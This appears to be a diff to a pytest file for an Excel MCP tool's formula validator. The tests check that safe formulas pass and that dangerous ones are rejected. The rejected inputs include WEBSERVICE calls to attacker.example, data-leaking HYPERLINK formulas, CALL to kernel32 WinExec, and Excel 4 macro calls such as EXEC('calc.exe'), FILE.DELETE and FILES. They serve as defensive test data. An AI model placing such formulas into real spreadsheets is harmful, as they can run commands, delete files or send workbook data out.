@@ -1,7 +1,12 @@
+from pathlib import Path
+
 import pytest
 
 from excel_mcp.errors import InvalidFormulaError, UnsafeFormulaError
 from excel_mcp.formulas import check_formula
+from tests.conftest import ToolCall
+
+pytestmark = pytest.mark.anyio
 
 SHEETS = ["Sheet1", "Sheet2", "Sheet3", "My Sheet", "Data", "Q1.Sales", "Report.v2", "Wow!", "It's"]
 
@@ -31,6 +36,22 @@ SHEETS = ["Sheet1", "Sheet2", "Sheet3", "My Sheet", "Data", "Q1.Sales", "Report.
         '="a|b"&A1',
         '=CONCAT("see ","https://example.com")',
         "=LET(x,A1*2,x+1)",
+        # Reading the open workbook and the host cannot send anything out.
+        '=INDIRECT("A"&B1)',
+        '=SUM(A1:INDIRECT("B2"))+Sheet1!A1:INDIRECT("B2")',
+        '=INDIRECT("R1C1",FALSE)',
+        '=CELL("address",A1)&CELL("filename",A1)',
+        '=INFO("osversion")',
+        # Links are fine when they are fixed text.
+        '=HYPERLINK("https://example.com/docs","Docs")',
+        '=HYPERLINK("HTTP://example.com")',
+        '=HYPERLINK("mailto:me@example.com?subject=Hi","Mail me")',
+        '=HYPERLINK("#Sheet2!A1","Go")',
+        "=HYPERLINK(\"#'My Sheet'!B2:C3\")",
+        '=HYPERLINK("#MyName","Go")',
+        # Names that look like macro functions are fine unless they are called.
+        "=SUM(Files,Result,Run,Input,Windows,Names)*Hyperlink",
+        "=Sheet1!Run+App.Total",
     ],
 )
 def test_safe_formulas_are_accepted(formula: str) -> None:
@@ -45,12 +66,9 @@ def test_safe_formulas_are_accepted(formula: str) -> None:
         '=WebService("https://attacker.example")',
         '=_xlfn.WEBSERVICE("https://attacker.example")',
         '=FILTERXML(WEBSERVICE("https://x"),"//a")',
-        '=HYPERLINK("https://phish.example","Click")',
         '=IMAGE("https://tracker.example/pixel.png")',
-        '=INDIRECT("A"&B1)',
         '=RTD("server",,"topic")',
         '=CALL("kernel32","WinExec","JCJ","calc",0)',
-        '=INFO("directory")',
         "=SUM(IF(A1>0,WEBSERVICE(B1),0))",
         '=webservice ("https://attacker.example")',
         '=_xlfn.WEBSERVICE ("https://attacker.example")',
@@ -61,15 +79,91 @@ def test_safe_formulas_are_accepted(formula: str) -> None:
         '=_xlfn._xlfn.WEBSERVICE("https://attacker.example")',
         '=_xlfn.MAP("https://attacker.example",_xleta.WEBSERVICE)',
         '=Sheet1!WEBSERVICE("https://attacker.example")',
-        '=CELL("filename",A1)',
-        '=SUM(A1:INDIRECT("B2"))',
-        '=Sheet1!A1:INDIRECT("B2")',
         '=A1:WEBSERVICE("https://attacker.example")',
         '=A1:@_xlfn.WEBSERVICE("https://attacker.example")',
     ],
 )
 def test_dangerous_functions_are_rejected(formula: str) -> None:
     with pytest.raises(UnsafeFormulaError, match="not allowed"):
+        check_formula(formula, SHEETS)
+
+
+XLM_CALLS = [
+    '=FILES("C:\\*")',
+    "=DIRECTORY()",
+    "=GET.WORKBOOK(1)",
+    "=get.workbook(1)",
+    "=GET.WINDOW(1)",
+    "=GET.FORMULA(A1)",
+    '=GET.NAME("x")',
+    "=GET.DEF(1)",
+    "=GET.OBJECT(1)",
+    "=GET.CELL(5,A1)",
+    "=GET.WORKSPACE(1)",
+    "=DOCUMENTS(1)",
+    "=WINDOWS(1)",
+    "=NAMES()",
+    '=FILE.EXISTS("C:\\x")',
+    '=FILE.DELETE("C:\\x")',
+    '=APP.TITLE("x")',
+    '=SEND.KEYS("x")',
+    '=RUN("macro")',
+    "=HALT()",
+    '=ALERT("x")',
+    '=EXEC("calc.exe")',
+    '=EVALUATE("1+1")',
+    '=FOPEN("C:\\x")',
+    '=WORKBOOK.ADD("x")',
+    '=ON.TIME(1,"x")',
+    '=SET.NAME("x",1)',
+    '=DEFINE.NAME("x","=1")',
+    '=OPEN("C:\\x.xlsx")',
+    '=SAVE.AS("C:\\x.xlsx")',
+    '=INITIATE("excel","x")',
+    "=_xlfn.GET.WORKBOOK(1)",
+    '=_xlfn._xlws.FILES("x")',
+    '=@FILES("x")',
+    '=Sheet1!FILES("x")',
+    '=A1:FILES("x")',
+    '=FILES ("x")',
+    '=files ("x")',
+    "=SUM(1,GET.WORKBOOK(1))",
+    "=MAP(A1:A3,_xleta.GET.WORKBOOK)",
+    "=MAP(A1:A3,_XLETA.FILES)",
+]
+
+
+@pytest.mark.parametrize("formula", XLM_CALLS)
+def test_excel_4_macro_functions_are_rejected(formula: str) -> None:
+    with pytest.raises(UnsafeFormulaError, match="macro function"):
+        check_formula(formula, SHEETS)
+
+
+@pytest.mark.parametrize(
+    "formula",
+    [
+        "=HYPERLINK(A1)",
+        '=HYPERLINK(A1,"x")',
+        '=HYPERLINK("https://example.com/?d="&A1,"x")',
+        '=HYPERLINK(CONCAT("https://","example.com"))',
+        '=HYPERLINK("https://example.com"&A1)',
+        '=HYPERLINK("file:///C:/x.exe","x")',
+        r'=HYPERLINK("\\\\server\\share\\x","x")',
+        '=HYPERLINK("C:\\x.exe")',
+        '=HYPERLINK("ftp://example.com")',
+        '=HYPERLINK(" https://example.com")',
+        '=HYPERLINK("#[book.xlsx]Sheet1!A1")',
+        r'=HYPERLINK("#C:\\x.xlsx!A1")',
+        '=HYPERLINK("#Missing!A1")',
+        '=HYPERLINK("#https://example.com")',
+        '=HYPERLINK ("https://example.com/"&A1)',
+        "=_xlfn.HYPERLINK(A1)",
+        "=Sheet1!HYPERLINK(A1)",
+        "=SUM(1,HYPERLINK(A1))",
+    ],
+)
+def test_hyperlinks_must_be_literal_safe_links(formula: str) -> None:
+    with pytest.raises(UnsafeFormulaError, match=r"HYPERLINK|other workbooks"):
         check_formula(formula, SHEETS)
 
 
@@ -119,3 +213,26 @@ def test_formula_must_start_with_equals() -> None:
 def test_unknown_sheet_error_lists_the_sheets() -> None:
     with pytest.raises(UnsafeFormulaError, match=r"'Q3' .* Sheets: 'Q1', 'Q2'"):
         check_formula("=Q3!A1", ["Q1", "Q2"])
+
+
+async def test_macro_functions_are_refused_in_names_and_cells(
+    call_error: ToolCall, call: ToolCall, sample: Path
+) -> None:
+    message = await call_error(
+        "set_defined_name", path="sales.xlsx", name="listing", refers_to='FILES("C:/*")'
+    )
+    assert "macro function" in message
+    message = await call_error(
+        "write_range", path="sales.xlsx", sheet="Data", start_cell="F1", rows=[["=GET.WORKBOOK(1)"]]
+    )
+    assert "macro function" in message
+    await call(
+        "write_range",
+        path="sales.xlsx",
+        sheet="Data",
+        start_cell="F1",
+        rows=[['=HYPERLINK("https://example.com","Docs")', '=INDIRECT("A1")']],
+    )
+    assert "HYPERLINK" in await call_error(
+        "write_range", path="sales.xlsx", sheet="Data", start_cell="F2", rows=[["=HYPERLINK(A2)"]]
+    )
